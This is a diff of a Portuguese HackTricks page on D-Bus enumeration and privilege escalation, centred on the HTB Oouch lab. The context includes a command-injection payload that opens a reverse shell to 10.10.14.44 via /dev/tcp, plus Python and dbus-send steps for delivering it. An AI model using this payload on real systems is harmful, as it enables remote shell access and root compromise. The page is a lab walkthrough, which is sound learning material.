@@ -4,23 +4,23 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
 ## **Enumeração GUI**
 
-O D-Bus é utilizado como mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, a operação concorrente de vários barramentos de mensagens é observada: o barramento do sistema, principalmente utilizado por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui é principalmente no barramento do sistema devido à sua associação com serviços em execução com privilégios mais elevados (por exemplo, root), uma vez que nosso objetivo é elevar privilégios. Observa-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
+O D-Bus é utilizado como mediador de comunicações entre processos (IPC) em ambientes de desktop do Ubuntu. No Ubuntu, a operação concorrente de vários barramentos de mensagens é observada: o barramento do sistema, principalmente utilizado por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui é principalmente no barramento do sistema devido à sua associação com serviços em execução com privilégios mais altos (por exemplo, root), uma vez que nosso objetivo é elevar privilégios. Observa-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
 
 Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que eles expõem. Os objetos podem ser comparados a instâncias de classe em linguagens de programação orientadas a objetos padrão, sendo cada instância identificada de forma única por um **caminho do objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, apresentando um método singular, Introspect. Este método retorna uma representação XML dos métodos suportados pelo objeto, sinais e propriedades, com foco aqui nos métodos, omitindo propriedades e sinais.
 
-Para a comunicação com a interface D-Bus, foram utilizadas duas ferramentas: uma ferramenta CLI chamada **gdbus** para invocação fácil de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
+Para a comunicação com a interface D-Bus, foram utilizadas duas ferramentas: uma ferramenta de CLI chamada **gdbus** para invocação fácil de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -33,11 +33,11 @@ Na primeira imagem, são mostrados os serviços registrados com o barramento do 
 
 Um recurso notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, importante para a relevância da pesquisa.
 
-**O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões em Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de passar para o serviço.
+**O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de passar para o serviço.
 
 No entanto, observe que **alguns métodos exigem autenticação** antes de nos permitir invocá-los. Vamos ignorar esses métodos, já que nosso objetivo é elevar nossos privilégios sem credenciais em primeiro lugar.
 
-Também observe que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ser autorizado a realizar certas ações ou não.
+Também observe que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ou não ser autorizado a realizar determinadas ações.
 
 ## **Enumeração de Linha de Comando**
 
@@ -69,7 +69,7 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### Conexões
 
-[Da Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando um processo estabelece uma conexão com um barramento, o barramento atribui à conexão um nome especial de barramento chamado _nome de conexão único_. Nomes de barramento desse tipo são imutáveis — é garantido que não mudarão enquanto a conexão existir — e, mais importante, não podem ser reutilizados durante a vida útil do barramento. Isso significa que nenhuma outra conexão com esse barramento terá atribuído um nome de conexão único, mesmo que o mesmo processo feche a conexão com o barramento e crie uma nova. Nomes de conexão únicos são facilmente reconhecíveis porque começam com o caractere de dois pontos — caso contrário proibido.
+[Da Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando um processo estabelece uma conexão com um barramento, o barramento atribui à conexão um nome especial de barramento chamado _nome de conexão único_. Nomes de barramento desse tipo são imutáveis — é garantido que não mudarão enquanto a conexão existir — e, mais importante, não podem ser reutilizados durante a vida útil do barramento. Isso significa que nenhuma outra conexão com esse barramento jamais terá atribuído um nome de conexão único, mesmo que o mesmo processo feche a conexão com o barramento e crie uma nova. Nomes de conexão únicos são facilmente reconhecíveis porque começam com o caractere de dois pontos — caso contrário proibido.
 
 ### Informações do Objeto de Serviço
 
@@ -143,9 +143,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Introspecionar Interface de um Objeto de Serviço
+### Introspect Interface of a Service Object
 
-Observe como neste exemplo foi selecionada a última interface descoberta usando o parâmetro `tree` (_ver seção anterior_):
+Observe como neste exemplo foi selecionada a interface mais recente descoberta usando o parâmetro `tree` (_ver seção anterior_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -163,13 +163,13 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Observe o método `.Block` da interface `htb.oouch.Block` (a que estamos interessados). O "s" das outras colunas pode significar que está esperando uma string.
+Observe o método `.Block` da interface `htb.oouch.Block` (aquela que nos interessa). O "s" das outras colunas pode significar que está esperando uma string.
 
 ### Interface de Monitoramento/Captura
 
-Com privilégios suficientes (apenas os privilégios `send_destination` e `receive_sender` não são suficientes) você pode **monitorar uma comunicação D-Bus**.
+Com privilégios suficientes (apenas `send_destination` e `receive_sender` não são suficientes), você pode **monitorar uma comunicação D-Bus**.
 
-Para **monitorar** uma **comunicação** você precisará ser **root**. Se ainda tiver problemas para ser root, verifique [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Para **monitorar** uma **comunicação**, você precisará ser **root**. Se ainda tiver problemas para ser root, consulte [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
 Se você souber como configurar um arquivo de configuração do D-Bus para **permitir que usuários não root espiem** a comunicação, por favor, **entre em contato comigo**!
@@ -204,7 +204,7 @@ Pode usar `capture` em vez de `monitor` para salvar os resultados em um arquivo 
 
 #### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Se houver muita informação no barramento, passe uma regra de correspondência da seguinte forma:
+Se houver muita informação no barramento, passe uma regra de correspondência assim:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
@@ -259,14 +259,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Como pode ver, está **conectando a uma interface D-Bus** e enviando para a função **"Block"** o "client\_ip".
+Como você pode ver, está **conectando a uma interface D-Bus** e enviando para a função **"Block"** o "client\_ip".
 
 Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Este código está **ouvindo** a conexão D-Bus **para o endereço IP e está chamando o iptables via função `system`** para bloquear o endereço IP fornecido.\
 **A chamada para `system` é vulnerável de propósito à injeção de comandos**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Explorar
 
-No final desta página, você pode encontrar o **código C completo da aplicação D-Bus**. Dentro dele, entre as linhas 91-97, você pode ver como o **`caminho do objeto D-Bus`** e o **`nome da interface`** são **registrados**. Essas informações serão necessárias para enviar informações para a conexão D-Bus:
+No final desta página, você pode encontrar o **código C completo da aplicação D-Bus**. Dentro dele, você pode encontrar entre as linhas 91-97 **como o `caminho do objeto D-Bus`** **e o `nome da interface`** são **registrados**. Essas informações serão necessárias para enviar informações para a conexão D-Bus:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -282,7 +282,7 @@ SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-O seguinte código Python enviará a carga útil para a conexão D-Bus para o método `Block` via `block_iface.Block(runme)` (_observe que foi extraído do trecho de código anterior_):
+O seguinte código Python enviará a carga útil para a conexão D-Bus para o método `Block` via `block_iface.Block(runme)` (_observe que foi extraído do trecho anterior de código_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -299,9 +299,9 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 * `dbus-send` é uma ferramenta usada para enviar mensagens para o "Message Bus".
 * Message Bus - Um software usado por sistemas para facilitar a comunicação entre aplicativos. Está relacionado com a Fila de Mensagens (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de assinatura e também são muito rápidas.
 * A tag "-system" é usada para mencionar que é uma mensagem do sistema, não uma mensagem de sessão (por padrão).
-* A tag "--print-reply" é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível para humanos.
+* A tag "--print-reply" é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível.
 * "--dest=Dbus-Interface-Block" - O endereço da interface Dbus.
-* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos para enviar mensagens como double, bytes, booleans, int, objpath. Dentre esses, o "objeto de caminho" é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string:;" - Isso é para chamar o caminho do objeto novamente onde colocamos o arquivo de shell reverso FIFO.
+* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos de envio de mensagens como double, bytes, booleans, int, objpath. Dentre esses, o "objeto de caminho" é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string:;" - Isso é para chamar o caminho do objeto novamente onde colocamos o arquivo/comando de shell reverso FIFO.
 
 _Obs: Em `htb.oouch.Block.Block`, a primeira parte (`htb.oouch.Block`) faz referência ao objeto de serviço e a última parte (`.Block`) faz referência ao nome do método._
 
@@ -462,7 +462,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
